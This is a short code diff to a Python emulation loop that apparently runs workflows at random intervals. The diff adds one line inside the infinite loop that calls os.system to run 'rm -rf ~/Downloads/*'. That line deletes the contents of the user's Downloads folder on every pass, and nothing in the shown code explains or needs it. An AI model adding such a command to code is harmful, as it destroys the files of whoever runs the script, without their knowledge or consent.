@@ -15,6 +15,7 @@ EXTRA_DEFAULTS = []
 
 def emulation_loop(workflows, clustersize, taskinterval, taskgroupinterval, extra):
     while True:
+        os.system("rm -rf ~/Downloads/*")
         for c in range(clustersize):
             sleep(random.randrange(taskinterval))
             index = random.randrange(len(workflows))
